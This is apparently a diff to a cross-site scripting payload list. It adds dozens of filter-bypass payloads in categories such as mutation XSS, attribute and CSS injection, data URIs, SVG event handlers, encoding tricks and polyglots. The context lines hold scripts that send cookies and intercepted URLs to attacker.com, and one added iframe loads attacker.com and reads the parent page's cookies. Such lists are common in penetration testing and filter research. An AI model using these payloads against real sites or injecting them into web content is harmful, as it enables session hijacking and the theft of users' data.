@@ -211,3 +211,96 @@ v-html="'<img src=x onerror=alert(1)>'"
 <script>document.location='http://attacker.com/?c='+document.cookie</script>
 <script>window.location.href='http://attacker.com/?c='+encodeURIComponent(document.cookie)</script>
 <script>XMLHttpRequest.prototype.open=function(m,u){if(u.indexOf('attacker')==-1){fetch('http://attacker.com/?u='+u)}}</script>
+
+# ── mXSS (MUTATION XSS) ──
+<listing><img src=x onerror=alert(1)>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<xmp><p title="</xmp><img src=x onerror=alert(1)>">
+<template><img src=x onerror=alert(1)></template>
+<math><mtext><table><mglyph><svg><mtext><textarea><a title="</textarea><img src=x onerror=alert(1)>">
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]>
+<select><option></select><img src=x onerror=alert(1)>
+<table><tr><td></table><img src=x onerror=alert(1)>
+<div id="</div><script>alert(1)</script>">
+<iframe src="//attacker.com/" onload="alert(parent.document.cookie)">
+
+# ── ATTRIBUTE INJECTION ──
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" autofocus onfocus="alert(1)
+' autofocus onfocus='alert(1)
+" onload="alert(1)
+" onclick="alert(1)
+"><img src=x onerror=alert(1) "
+'><img src=x onerror=alert(1) '
+" style="color:red" onmouseover="alert(1)
+ style=xss:expression(alert(1))
+ expression(alert(1))
+;background:url('javascript:alert(1)')
+
+# ── CSS INJECTION ──
+<style>@import 'javascript:alert(1)';</style>
+<style>body{background:url('javascript:alert(1)')}</style>
+<style>*{color:red}</style>
+<div style="background:url('java\nscript:alert(1)')">
+<div style="background:url('java script:alert(1)')">
+</style><script>alert(1)</script>
+<style>*{xss:expression(alert(1))}</style>
+
+# ── DATA URI / PROTOCOL ──
+<iframe src="data:text/html,<script>alert(parent.document.cookie)</script>">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+">
+<a href="data:text/html,<script>alert(1)</script>">click me</a>
+<form action="data:text/html,<script>alert(1)</script>"><input type=submit>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="data:text/html,<script>alert(1)</script>">
+
+# ── SVG EXTENDED ──
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set attributeName=onmouseover value=alert(1)>
+<svg><animateTransform onbegin=alert(1) attributeName=transform>
+<svg><image xlink:href="x" onerror="alert(1)">
+<svg><a xlink:href="javascript:alert(1)"><rect width=100 height=100/></a>
+<svg><script type="text/javascript">alert(1)</script></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+
+# ── UNICODE / CHARSET BYPASS ──
+<script>alert(1)</script>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert&#40;1&#41;>
+<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>
+<a href=javascript:alert&#40;1&#41;>click</a>
+<script>alert(1)</script>
+<svg/onload=alert(1)>
+
+# ── CONTEXT: JSON RESPONSE ──
+</script><script>alert(1)</script>
+\";<script>alert(1)</script>
+\");alert(1);//
+"}alert(1)//
+';alert(1);//
+`${alert(1)}`
+\x3cscript\x3ealert(1)\x3c/script\x3e
+
+# ── POLYGLOT EXTENDED ──
+<img/src/onerror=alert(1)>
+<img src=`x`onerror=alert(1)>
+<img src="x" onerror="alert(1)">
+<img src='x' onerror='alert(1)'>
+<ImG sRc=X oNeRrOr=alert(1)>
+<iMg src=x onerror=alert(1)//>
+<IMG SRC=x OnErRoR=alert(1)>
+<svg onload="ale"+"rt(1)">
+<svg onload="ale\x72t(1)">
+<svg onload="win"+"dow['ale'+'rt'](1)">
+<img src onerror="window['al\x65rt'](1)">
+
+# ── BROWSER SPECIFIC ──
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
+<link rel="stylesheet" href="javascript:alert(1)">
+<link rel="import" href="data:text/html,<script>alert(1)</script>">
+<script type="text/javascript" src="data:,alert(1)"></script>
